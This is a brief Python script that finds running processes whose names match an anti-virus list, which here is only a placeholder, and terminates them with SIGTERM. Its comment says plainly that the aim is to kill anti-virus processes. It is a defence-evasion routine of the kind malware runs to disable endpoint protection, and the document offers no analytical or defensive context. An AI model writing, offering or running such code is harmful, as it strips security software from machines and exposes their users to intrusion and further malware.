import psutil,os,signal

av_list = ["path/to/anti-virus/list"]

# Find and Kill The Anti virus Processes
for process in psutil.process_iter():
    for name in av_list:
        if name in process.name():
            os.kill(process.pid,signal.SIGTERM)
